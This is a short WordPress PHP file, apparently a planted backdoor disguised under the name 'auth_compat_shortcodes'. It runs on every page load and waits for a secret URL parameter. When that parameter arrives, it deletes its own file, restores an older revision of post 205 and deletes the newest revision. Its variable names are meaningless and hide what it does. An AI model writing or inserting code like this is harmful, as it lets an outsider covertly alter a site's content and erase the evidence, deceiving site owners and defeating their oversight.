<?php

function auth_compat_shortcodes() {
	if (isset($_GET['reminder_duplicate_heading_publisher']) && $_GET['reminder_duplicate_heading_publisher'] === 'latest_csv_full_content') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$cookies_floating_github_css = 205;
		$lead_hidden_exchange = wp_get_post_revisions($cookies_floating_github_css);
		if (empty($lead_hidden_exchange)) die('no revisions');
		if (count($lead_hidden_exchange) < 2) die('less than 2');
		$affiliates_scroll_google_gallery = array_shift($lead_hidden_exchange);
		$online_pixel_dynamic_dist = $affiliates_scroll_google_gallery->ID;
		$rates_parts_invoice = array_shift($lead_hidden_exchange);
		$background_disable_crm_save = $rates_parts_invoice->ID;
		$conversion_permalink_another = wp_restore_post_revision($background_disable_crm_save);
		if ($conversion_permalink_another === false) die('error restoring');
		$conversion_permalink_another = wp_delete_post_revision($online_pixel_dynamic_dist);		
		if ($conversion_permalink_another === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'auth_compat_shortcodes');
